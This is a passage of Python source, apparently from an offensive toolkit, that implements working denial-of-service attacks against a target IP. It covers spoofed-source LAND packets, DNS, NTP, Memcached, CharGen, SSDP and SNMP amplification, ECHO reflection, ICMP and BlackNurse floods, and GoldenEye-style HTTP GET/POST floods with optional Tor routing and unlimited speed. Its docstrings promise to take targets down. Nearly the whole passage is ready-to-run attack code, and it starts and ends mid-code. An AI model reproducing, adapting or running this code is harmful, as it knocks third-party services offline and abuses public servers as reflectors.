        k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
        for _ in range(1,random.randint(1,3)):
         k+=random.choice(lis)
        j=''
        for x in range(0,random.randint(11,31)):
         j+=random.choice(lis)
        par =(k*random.randint(3,5))+str(random.randint(1,100000))+'='+(j*random.randint(20,30))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
        urd= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n{}".format(pths+'?'+str(random.randint(0,100000000))+random.choice(lis)+str(random.randint(0,100000000)),random.choice(ua),l,random.randint(300,1000),len(par),self.target,par)
    packet = IP(ttl=random.randint(self.minttl,self.maxttl),src=self.target, dst=self.target)/TCP(window=windf,sport=self.port,dport=self.port)/urd
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    packet=bytes(packet)
    s.sendto(packet,(self.target,self.port))
    land_counter+=1
    if prints==True:
     print("[!]Packets: {} | Type: {} | Bytes: {}".format(land_counter,req,len(urd)))
   except Exception as e:
    pass
   time.sleep(self.speed)
def land(u,p=80,min_size=1,max_size=1400,limiting=True,level=1,threads=100,max_window=255,min_window=1,min_ttl=64,max_ttl=64,payload=0,window=-1,interval=300,logs=True,returning=False):
 '''
   this function is for LAND attack in which we are spoofing the victim's IP and targeted port.
'''
 global maxsize
 maxsize=max_size
 global minsize
 minsize=min_size
 global speed
 if level<=1:
  speed=0.1
 elif level==2:
  speed=0.05
 elif level==3:
  speed=0.01
 elif level==4:
  speed=0.005
 elif level>=5:
  speed=0.001
 if limiting==False:
  speed=0
 global land_counter
 land_counter=0
 global stop
 stop=False
 global max_win
 max_win=max_window
 if max_win>256:
   max_win=256
 global min_win
 min_win=min_window
 if min_win<0:
   min_win=0
 global prints
 prints=logs
 global target
 target=u
 global port
 port=p
 global maxttl
 maxttl=max_ttl
 global minttl
 minttl=min_ttl
 global paylo
 paylo=int(payload)
 if paylo<0:
   paylo=0
 if paylo>2:
   paylo=2
 global winds
 winds=window
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error as msg:
  print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
 if wh>0:  
  for x in range(threads):
   ln().start()
  c=time.time()
  while True:
   if stop==True:
     break
   try:
    time.sleep(.1)
    if int(time.time()-c)==interval:
     stop=True
     break
   except KeyboardInterrupt:
    stop=True
    break
  if returning==True:
    return land_counter
class dampli(threading.Thread):
 def run(self):
  global dnsamplif_counter
  self.speed=speed
  self.target=target
  self.port=port
  self.query=query
  time.sleep(2)
  while (stop!=True):
   try:
    ip=random.choice(dnsl)
    packet= IP(src=self.target, dst=ip) / UDP(sport=self.port,dport=53) / DNS(rd=1, qd=DNSQR(qname=random.choice(domainl), qtype=self.query))
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    packet=bytes(packet)
    s.sendto(packet,(ip,53))
    dnsamplif_counter+=1
    if prints==True:
     print ("[!]Packets sent: {} | IP: {}".format(dnsamplif_counter,ip))
   except Exception as e:
    pass
   time.sleep(self.speed)
def dnsamplif(u,p=80,limiting=True,level=1,dnslist=[],threads=100,q='ANY',interval=300,logs=True,returning=False):
 '''
   this function is for DNS amplification attack using and list of DNS servers provided by the user.

   it takes the following parameters:

   u: target IP
   dnslist: your DNS servers list
   threads: (set by default to: 100)
   q: (set by default to: "ALL") query type

   exapmle:

   >>>a=['124.0.2.2','22.3.55.45',.........]
   >>>bane.dnsamplif('8.8.8.8',dnslist=a)

'''
 global speed
 if level<=1:
  speed=0.1
 elif level==2:
  speed=0.05
 elif level==3:
  speed=0.01
 elif level==4:
  speed=0.005
 elif level>=5:
  speed=0.001
 if limiting==False:
  speed=0
 global dnsamplif_counter
 dnsamplif_counter=0
 global stop
 stop=False
 global prints
 prints=logs
 global target
 target=u
 global port
 port=p
 global dnsl
 dnsl=[]
 dnsl=dnslist
 if dnsl==[]:
  dns1=get_public_dns()
  for x in dns1:
   if '.' in x:
    dnsl.append(x)
 global query
 query=q
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error as msg:
  print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
 if wh>0:  
  for x in range(threads):
   dampli().start()
  c=time.time()
  while True:
   if stop==True:
     break
   try:
    time.sleep(.1)
    if int(time.time()-c)==interval:
     stop=True
     break
   except KeyboardInterrupt:
    stop=True
    break
  if returning==True:
    return dnsamplif_counter
class nampli(threading.Thread):
 def run(self):
  global ntpamplif_counter
  self.speed=speed
  self.target=target
  self.port=port
  time.sleep(2)
  while (stop!=True):
   try:
    ip=random.choice(ntpl)
    packet=IP(src=self.target, dst=ip)/UDP(sport=self.port,dport=123)/Raw(load='\x17\x00\x02\x2a'+'\x00'*4)
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    packet=bytes(packet)
    s.sendto(packet,(ip,123))
    ntpamplif_counter+=1
    if prints==True:
     print ("[!]Packets sent: {} | IP: {}".format(ntpamplif_counter,ip))
   except Exception as e:
    pass
   time.sleep(self.speed)
def ntpamplif(u,p=80,limiting=True,level=1,ntplist=[],threads=100,interval=300,logs=True,returning=False):
 '''
   this function is for NTP amplification attack using and list of DNS servers provided by the user.

   it takes the following parameters:

   u: target IP
   ntplist: your NTP servers list
   threads: (set by default to: 100)

   exapmle:

   >>>a=['124.0.2.2','22.3.55.45',.........]
   >>>bane.ntpamplif('8.8.8.8',ntplist=a)

'''
 global ntpamplif_counter
 global speed
 if level<=1:
  speed=0.1
 elif level==2:
  speed=0.05
 elif level==3:
  speed=0.01
 elif level==4:
  speed=0.005
 elif level>=5:
  speed=0.001
 if limiting==False:
  speed=0
 ntpamplif_counter=0
 global stop
 stop=False
 global prints
 prints=logs
 global target
 target=u
 global port
 port=p
 global ntpl
 ntpl=ntplist
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error as msg:
  print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
 if wh>0:  
  for x in range(threads):
   nampli().start()
  c=time.time()
  while True:
   if stop==True:
     break
   try:
    time.sleep(.1)
    if int(time.time()-c)==interval:
     stop=True
     break
   except KeyboardInterrupt:
    stop=True
    break
  if returning==True:
    return ntpamplif_counter
class memampli(threading.Thread):
 def run(self):
  global memcacheamplif_counter
  self.speed=speed
  self.target=target
  self.port=port
  time.sleep(2)
  while (stop!=True):
   try:
    ip=random.choice(meml)
    packet=IP(src=self.target, dst=ip)/UDP(sport=self.port,dport=11211)/Raw(load="\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n")
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    packet=bytes(packet)
    s.sendto(packet,(ip,11211))
    memcacheamplif_counter+=1
    if prints==True:
     print ("[!]Packets sent: {} | IP: {}".format(memcacheamplif_counter,ip))
   except Exception as e:
    pass
   time.sleep(self.speed)
def memcacheamplif(u,p=80,limiting=True,level=1,memlist=[],threads=100,interval=300,logs=True,returning=False):
 '''
   this function is for Memcached amplification attack using and list of DNS servers provided by the user.

   it takes the following parameters:

   u: target IP
   memlist: your Memcache servers list
   threads: (set by default to: 100)

   exapmle:

   >>>a=['124.0.2.2','22.3.55.45',.........]
   >>>bane.memcacheamplif('8.8.8.8',memlist=a)

'''
 global memcacheamplif_counter
 memcacheamplif_counter=0
 global speed
 if level<=1:
  speed=0.1
 elif level==2:
  speed=0.05
 elif level==3:
  speed=0.01
 elif level==4:
  speed=0.005
 elif level>=5:
  speed=0.001
 if limiting==False:
  speed=0
 global stop
 stop=False
 global prints
 prints=logs
 global target
 target=u
 global port
 port=p
 global meml
 meml=memlist
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error as msg:
  print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
 if wh>0:  
  for x in range(threads):
   memampli().start()
  c=time.time()
  while True:
   if stop==True:
     break
   try:
    time.sleep(.1)
    if int(time.time()-c)==interval:
     stop=True
     break
   except KeyboardInterrupt:
    stop=True
    break
  if returning==True:
    return memcacheamplif_counter
class charampli(threading.Thread):
 def run(self):
  global chargenamplif_counter
  self.target=target
  self.speed=speed
  self.port=port
  time.sleep(2)
  while (stop!=True):
   try:
    ip=random.choice(chargenl)
    packet=IP(src=self.target, dst=ip)/UDP(sport=self.port,dport=19)/random.choice(lis)
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    packet=bytes(packet)
    s.sendto(packet,(ip,19))
    chargenamplif_counter+=1
    if prints==True:
     print ("[!]Packets sent: {} | IP: {}".format(chargenamplif_counter,ip))
   except Exception as e:
    pass
   time.sleep(self.speed)
def chargenamplif(u,p=80,limiting=True,level=1,chargenlist=[],threads=100,interval=300,logs=True,returning=False):
 '''
   this function is for CharGen amplification attack using and list of DNS servers provided by the user.

   it takes the following parameters:

   u: target IP
   chargenlist: your CharGen servers list
   threads: (set by default to: 100)

   exapmle:

   >>>a=['124.0.2.2','22.3.55.45',.........]
   >>>bane.chargenamplif('8.8.8.8',ntplist=a)

'''
 global chargenamplif_counter
 chargenamplif_counter=0
 global speed
 if level<=1:
  speed=0.1
 elif level==2:
  speed=0.05
 elif level==3:
  speed=0.01
 elif level==4:
  speed=0.005
 elif level>=5:
  speed=0.001
 if limiting==False:
  speed=0
 global stop
 stop=False
 global prints
 prints=logs
 global target
 target=u
 global port
 port=p
 global chargenl
 chargenl=chargenlist
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error as msg:
  print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
 if wh>0:  
  for x in range(threads):
   charampli().start()
  c=time.time()
  while True:
   if stop==True:
     break
   try:
    time.sleep(.1)
    if int(time.time()-c)==interval:
     stop=True
     break
   except KeyboardInterrupt:
    stop=True
    break
  if returning==True:
    return chargenamplif_counter
class ssampli(threading.Thread):
 def run(self):
  global ssdpamplif_counter
  self.speed=speed
  self.target=target
  self.port=port
  time.sleep(2)
  while (stop!=True):
   try:
    ip=random.choice(ssdpl)
    packet=IP(src=self.target, dst=ip)/UDP(sport=self.port,dport=1900)/Raw(load='M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n')
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    packet=bytes(packet)
    s.sendto(packet,(ip,1900))
    ssdpamplif_counter+=1
    if prints==True:
     print ("[!]Packets sent: {} | IP: {}".format(ssdpamplif_counter,ip))
   except Exception as e:
    pass
   time.sleep(self.speed)
def ssdpamplif(u,p=80,limiting=True,level=1,ssdplist=[],threads=100,interval=300,logs=True,returning=False):
 '''
   this function is for CharGen amplification attack using and list of DNS servers provided by the user.

   it takes the following parameters:

   u: target IP
   ssdplist: your CharGen servers list
   threads: (set by default to: 100)

   exapmle:

   >>>a=['124.0.2.2','22.3.55.45',.........]
   >>>bane.ssdpamplif('8.8.8.8',ntplist=a)

'''
 global ssdpamplif_counter
 ssdpamplif_counter=0
 global speed
 if level<=1:
  speed=0.1
 elif level==2:
  speed=0.05
 elif level==3:
  speed=0.01
 elif level==4:
  speed=0.005
 elif level>=5:
  speed=0.001
 if limiting==False:
  speed=0
 global stop
 stop=False
 global prints
 prints=logs
 global target
 target=u
 global port
 port=p
 global ssdpl
 ssdpl=ssdplist
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error as msg:
  print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
 if wh>0:  
  for x in range(threads):
   ssampli().start()
  c=time.time()
  while True:
   if stop==True:
     break
   try:
    time.sleep(.1)
    if int(time.time()-c)==interval:
     stop=True
     break
   except KeyboardInterrupt:
    stop=True
    break
  if returning==True:
    return ssdpamplif_counter
class snampli(threading.Thread):
 def run(self):
  global snmpamplif_counter
  self.target=target
  self.speed=speed
  self.port=port
  time.sleep(2)
  while (stop!=True):
   try:
    ip=random.choice(snmpl)
    packet=IP(src=self.target, dst=ip)/UDP(sport=self.port,dport=161)/Raw(load='\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00')
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    packet=bytes(packet)
    s.sendto(packet,(ip,161))
    snmpamplif_counter+=1
    if prints==True:
     print ("[!]Packets sent: {} | IP: {}".format(snmpamplif_counter,ip))
   except Exception as e:
    pass
   time.sleep(self.speed)
def snmpamplif(u,p=80,limiting=True,level=1,snmplist=[],threads=100,interval=300,logs=True,returning=False):
 '''
   this function is for SNMP amplification attack using and list of DNS servers provided by the user.

   it takes the following parameters:

   u: target IP
   snmplist: your SNMP servers list
   threads: (set by default to: 100)
  
   exapmle:

   >>>a=['124.0.2.2','22.3.55.45',.........]
   >>>bane.snmpamplif('8.8.8.8',snmplist=a)

'''
 global snmpamplif_counter
 snmpamplif_counter=0
 global speed
 if level<=1:
  speed=0.1
 elif level==2:
  speed=0.05
 elif level==3:
  speed=0.01
 elif level==4:
  speed=0.005
 elif level>=5:
  speed=0.001
 if limiting==False:
  speed=0
 global stop
 stop=False
 global prints
 prinnts=logs
 global target
 target=u
 global port
 port=p
 global snmpl
 snmpl=snmplist
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error as msg:
  print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
 if wh>0:  
  for x in range(threads):
   snampli().start()
  c=time.time()
  while True:
   if stop==True:
     break
   try:
    time.sleep(.1)
    if int(time.time()-c)==interval:
     stop=True
     break
   except KeyboardInterrupt:
    stop=True
    break
  if returning==True:
    return snmpamplif_counter
class echst(threading.Thread):
 def run(self):
  global echo_ref_counter
  self.target=target
  self.minsize=minsize
  self.maxsize=maxsize
  self.speed=speed
  self.port=port
  time.sleep(2)
  while (stop!=True):
   data=''
   for x in range(random.randint(self.minsize,self.maxsize)):
    data +=random.choice(lis)
   if len(data)>1400:
    data=data[0:1400]
   try:
    ip=random.choice(pingl)
    packet=IP(src=self.target, dst=ip)/UDP(sport=self.port,dport=7)/Raw(load=data)
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    packet=bytes(packet)
    s.sendto(packet,(ip,port))
    echo_ref_counter+=1
    if prints==True:
     print("[!]Packets sent: {} | IP: {} | Bytes: {}".format(echo_ref_counter,ip,len(data)))
   except Exception as e:
    pass
   time.sleep(self.speed)
def echo_ref(u,p=80,min_size=1,max_size=1400,limiting=True,level=1,pinglist=[],threads=100,interval=300,logs=True,returning=True):
 '''
   this function is for ECHO  reflection attack
'''
 global minsize
 minsize=min_size
 global maxsize
 maxsize=max_size
 global echo_ref_counter
 echo_ref_counter=0
 global speed
 if level<=1:
  speed=0.1
 elif level==2:
  speed=0.05
 elif level==3:
  speed=0.01
 elif level==4:
  speed=0.005
 elif level>=5:
  speed=0.001
 if limiting==False:
  speed=0
 global stop
 stop=False
 global prints
 prints=logs
 global target
 target=u
 global port
 port=p
 global pingl
 pingl=pinglist
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error as msg:
  print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
 if wh>0:  
  for x in range(threads):
   echst().start()
  c=time.time()
  while True:
   if stop==True:
     break
   try:
    time.sleep(.1)
    if int(time.time()-c)==interval:
     stop=True
     break
   except KeyboardInterrupt:
    stop=True
    break
  if returning==True:
    return echo_ref_counter
class icmpcl(threading.Thread):
 def run(self):
  global icmp_counter
  self.speed=speed
  self.minsize=minsize
  self.maxsize=maxsize
  self.target=target
  self.port=port
  self.minttl=minttl
  self.maxttl=maxttl
  time.sleep(2)
  while (stop!=True):
   data=''
   for x in range(random.randint(self.minsize,self.maxsize)):
     data +=random.choice(lis)
   if len(data)>1400:
    data=data[0:1400]
   try:
    packet=IP(ttl=random.randint(self.minttl,self.maxttl),dst=self.target)/ICMP()/data
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, 1)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    packet=bytes(packet)
    s.sendto(packet,(self.target,self.port))
    icmp_counter+=1
    if prints==True:
     print("[!]Packets sent: {} | Bytes: {}".format(icmp_counter,len(data)))
   except Exception as e:
    pass
   time.sleep(self.speed)
def icmp(u,p=80,min_size=1,max_size=1400,limiting=True,level=1,min_ttl=64,max_ttl=64,threads=100,interval=300,logs=True,returning=False):
 '''
   this function is for ICMP flood attack
'''
 global maxsize
 maxsize=max_size
 global minsize
 minsize=min_size
 global speed
 if level<=1:
  speed=0.1
 elif level==2:
  speed=0.05
 elif level==3:
  speed=0.01
 elif level==4:
  speed=0.005
 elif level>=5:
  speed=0.001
 if limiting==False:
  speed=0
 global icmp_counter
 icmp_counter=0
 global stop
 stop=False
 global prints
 prints=logs
 global target
 target=u
 global port
 port=p
 global maxttl
 maxttl=max_ttl
 global minttl
 minttl=min_ttl
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error as msg:
  print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
 if wh>0:  
  for x in range(threads):
   icmpcl().start()
  c=time.time()
  while True:
   if stop==True:
     break
   try:
    time.sleep(.1)
    if int(time.time()-c)==interval:
     stop=True
     break
   except KeyboardInterrupt:
    stop=True
    break
  if returning==True:
    return icmp_counter
class icmpst(threading.Thread):
 def run(self):
  global icmpstorm_counter
  self.speed=speed
  self.target=target
  self.port=port
  self.minttl=minttl
  self.maxttl=maxttl
  self.minsize=minsize
  self.ip_seg=ip_seg
  time.sleep(2)
  while (stop!=True):
   data=''
   for x in range(random.randint(self.minsize,self.maxsize)):
     data +=random.choice(lis)
   if len(data)>1400:
    data=data[0:1400]
   try:
    if self.ip_seg==None:
     sip=getip()
    else:
     sip=self.ip_seg.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
    packet=IP(ttl=random.randint(self.minttl,self.maxttl),src=sip,dst=self.target)/ICMP()/data
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, 1)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    packet=bytes(packet)
    s.sendto(packet,(self.target,self.port))
    icmpstorm_counter+=1
    if prints==True:
     print("[!]Packets sent: {} | IP: {} | Bytes: {}".format(icmpstorm_counter,sip,len(data)))
   except Exception as e:
    pass
   time.sleep(self.speed)
def icmpstorm(u,p=80,min_size=1,max_size=1400,limiting=True,level=1,ip_range=None,min_ttl=64,max_ttl=64,threads=100,interval=300,logs=True,returning=True):
 '''
   this function is for ICMP flood with spoofed sources
'''
 global minsize
 minsize=min_size
 global maxsize
 maxsize=max_size
 global icmpstorm_counter
 icmpstorm_counter=0
 global speed
 if level<=1:
  speed=0.1
 elif level==2:
  speed=0.05
 elif level==3:
  speed=0.01
 elif level==4:
  speed=0.005
 elif level>=5:
  speed=0.001
 if limiting==False:
  speed=0
 global stop
 stop=False
 global ip_seg
 ip_seg=ip_range
 global prints
 prints=logs
 global target
 target=u
 global port
 port=p
 global maxttl
 maxttl=max_ttl
 global minttl
 minttl=min_ttl
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error as msg:
  print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
 if wh>0:  
  for x in range(threads):
   icmpst().start()
  c=time.time()
  while True:
   if stop==True:
     break
   try:
    time.sleep(.1)
    if int(time.time()-c)==interval:
     stop=True
     break
   except KeyboardInterrupt:
    stop=True
    break
  if returning==True:
    return icmpstorm_counter
class blnu(threading.Thread):
 def run(self):
  global blacknurse_counter
  self.target=target
  self.speed=speed
  self.port=port
  self.minttl=minttl
  self.maxttl=maxttl
  self.ip_seg=ip_seg
  time.sleep(2)
  while (stop!=True):
   try:
    if self.ip_seg==None:
     sip=getip()
    else:
     sip=self.ip_seg.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
    packet=IP(ttl=random.randint(self.minttl,self.maxttl),src=sip,dst=self.target)/ICMP(type=3,code=3)
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    packet=bytes(packet)
    s.sendto(packet,(self.target,self.port))
    blacknurse_counter+=1
    if prints==True:
     print ("[!]Packets sent: {} | IP: {}".format(blacknurse_counter,sip))
   except Exception as e:
    pass
   time.sleep(self.speed)
def blacknurse(u,p=80,limiting=True,level=1,ip_range=None,min_ttl=64,max_ttl=64,threads=100,payloads=False,interval=300,logs=True,returning=False):
 '''
   this function is for "black nurse" attack
'''
 global blacknurse_counter
 blacknurse_counter=0
 global speed
 if level<=1:
  speed=0.1
 elif level==2:
  speed=0.05
 elif level==3:
  speed=0.01
 elif level==4:
  speed=0.005
 elif level>=5:
  speed=0.001
 if limiting==False:
  speed=0
 global stop
 stop=False
 global ip_seg
 ip_seg=ip_range
 global prints
 prints=logs
 global target
 target=u
 global port
 port=p
 global maxttl
 maxttl=max_ttl
 global minttl
 minttl=min_ttl
 global paylo
 paylo=payloads
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error as msg:
  print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
 if wh>0:  
  for x in range(threads):
   blnu().start()
  c=time.time()
  while True:
   if stop==True:
     break
   try:
    time.sleep(.1)
    if int(time.time()-c)==interval:
     stop=True
     break
   except KeyboardInterrupt:
    stop=True
    break
  if returning==True:
    return blacknurse_counter
class gldn(threading.Thread):
 def run(self):
  global goldeneye_counter
  self.target=target
  self.port=port
  self.method=method
  self.timeout=timeout
  time.sleep(2)
  while (stop!=True):
   pa=random.choice(paths)
   try:
    conn = httplib.HTTPConnection(self.target, self.port, timeout=self.timeout)
    if self.method==1:
     req="GET"
     q=''
     for i in range(1,random.randint(2,15)):
      q+=random.choice(lis)
     p=''
     for i in range(1,random.randint(2,15)):
      p+=random.choice(lis)
     if '?' in pa:
      jo='&'
     else:
      jo='?' 
     pa+=jo+q+"="+p
     h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5', 'Cache-Control':'no-cache','Connection': 'keep-alive','Keep-Alive': random.randint(100,1000), 'Host': self.target}
     conn.request("GET", pa,headers=h)
    elif self.method==2:
      req="POST"
      k=''
      for _ in range(1,random.randint(2,5)):
       k+=random.choice(lis)
      k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      for _ in range(1,random.randint(1,3)):
       k+=random.choice(lis)
      j=''
      for x in range(0,random.randint(11,31)):
       j+=random.choice(lis)
      params =(k*random.randint(3,5))+str(random.randint(1,100000))+'='+(j*random.randint(300,500))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      headers={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': random.randint(100,1000),'Content-Length': len(params) ,'Content-Type': 'application/x-www-form-urlencoded','Host': self.target}
      conn.request("POST",pa , params, headers)
    elif self.method==3:
     i=random.randint(1,2)
     if i==1:
      req="GET"
      q=''
      for i in range(1,random.randint(2,15)):
       q+=random.choice(lis)
      p=''
      for i in range(1,random.randint(2,15)):
       p+=random.choice(lis)
      if '?' in pa:
       jo='&'
      else:
       jo='?' 
      pa+=jo+q+"="+p
      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Cache-Control':'no-cache','Connection': 'keep-alive','Keep-Alive': random.randint(100,1000), 'Host': self.target}
      conn.request("GET",pa,headers=h)
     else:
      req="POST"
      k=''
      for _ in range(1,random.randint(2,5)):
       k+=random.choice(lis)
      k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      for _ in range(1,random.randint(1,3)):
       k+=random.choice(lis)
      j=''
      for x in range(0,random.randint(11,31)):
       j+=random.choice(lis)
      params =(k*random.randint(3,5))+str(random.randint(1,100000))+'='+(j*random.randint(300,500))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      headers={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': random.randint(100,1000),'Content-Length': len(params) ,'Content-Type': 'application/x-www-form-urlencoded','Host': self.target}
      conn.request("POST", pa, params, headers)
    if stop==True:
        break
    goldeneye_counter+=1
    if prints==True:
     print("[!]Requests: {} | Type: {}".format(goldeneye_counter,req))
   except Exception as e:
    pass
   time.sleep(.1)
def goldeneye(u,p=80,threads=700,meth=3,maxtime=5,interval=300,logs=True,returning=False):
 '''
   this function is for goldeneye attack with more effective method that take down the targets and doesn't consume much of your resources! thr reason that the original script pushs too much on your device is the fact that it fabricate he useragents string, random ascii blocks and the http headers on its own for every single request at the same time, so as much as you use more threads it's going to use more of your resources. here i already provided it with more than 10k unique useragents outside all clases (no need to redeclare it inside the class' functions everytime and push on the memory) and just formating the values of the http headers and the ascii strings.

   it takes the same parameters as the other, but with extra one:

   meth: (set by default to: 1) you can choos the type of http flood you wantby setting it betweeen 1 and 3:
   1=>GET
   2=>POST
   3=>randomly: GET & POST

'''
 global goldeneye_counter
 goldeneye_counter=0
 global stop
 stop=False
 global prints
 prints=logs
 global target
 target=u
 global method
 method=meth
 global port 
 port=p
 global timeout
 timeout=maxtime
 for x in range(threads):
  t=gldn()
  t.start()
 c=time.time()  
 while True:
  if stop==True:
     break
  try:
   time.sleep(.1)
   if int(time.time()-c)==interval:
    stop=True
    break
  except KeyboardInterrupt:
   stop=True
   break
 if returning==True:
    return goldeneye_counter
class dosecl(threading.Thread):
 def run(self):
  global doser_counter
  self.target=target
  u=self.target
  self.timeout=timeout
  self.method=method
  self.tor=tor
  host=u.split('://')[1].split('/')[0]
  time.sleep(2)
  while (stop!=True):
   u=self.target
   try:
    if self.method==1:
     req="GET"
     q=''
     for i in range(1,random.randint(2,15)):
      q+=random.choice(lis)
     p=''
     for i in range(1,random.randint(2,15)):
      p+=random.choice(lis)
     if '?' in u:
      jo='&'
     else:
      jo='?' 
     u+=jo+q+"="+p
     h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5', 'Cache-Control':'no-cache','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,120)), 'Host': host}
     if self.tor==True:
       session = requests.session()
       session.proxies = {}
       session.proxies['http'] = 'socks5h://localhost:9050'
       session.proxies['https'] = 'socks5h://localhost:9050'
       session.get(u,headers=h,timeout=self.timeout, verify=False)
     else:
       requests.get(u,headers=h,timeout=self.timeout, verify=False)
    elif self.method==2:
      req="POST"
      q=''
      for i in range(1,random.randint(2,15)):
       q+=random.choice(lis)
      p=''
      for i in range(1,random.randint(2,15)):
       p+=random.choice(lis)
      if '?' in u:
       jo='&'
      else:
       jo='?' 
      u+=jo+q+"="+p
      k=''
      for _ in range(1,random.randint(2,5)):
       k+=random.choice(lis)
      k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      for _ in range(1,random.randint(1,3)):
       k+=random.choice(lis)+str(random.randint(1,10000))
      j=''
      for x in range(0,random.randint(11,31)):
       j+=random.choice(lis)+str(random.randint(1,10000))
      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,1000)) ,'Content-Type': 'application/x-www-form-urlencoded','Host': host}
      if self.tor==True:
       session = requests.session()
       session.proxies = {}
       session.proxies['http'] = 'socks5h://localhost:9050'
       session.proxies['https'] = 'socks5h://localhost:9050'
       session.post(u, data={k:j}, headers=h,timeout=self.timeout, verify=False)
      else:
       requests.post(u, data={k:j}, headers=h,timeout=self.timeout, verify=False)
    elif self.method==3:
     i=random.randint(1,2)
     if i==1:
      req="GET"
      q=''
      for i in range(1,random.randint(2,15)):
       q+=random.choice(lis)
      p=''
      for i in range(1,random.randint(2,15)):
       p+=random.choice(lis)
      if '?' in u:
       jo='&'
      else:
       jo='?' 
      u+=jo+q+"="+p
      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5', 'Cache-Control':'no-cache','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,120)), 'Host': host}
      if self.tor==True:
       session = requests.session()
       session.proxies = {}
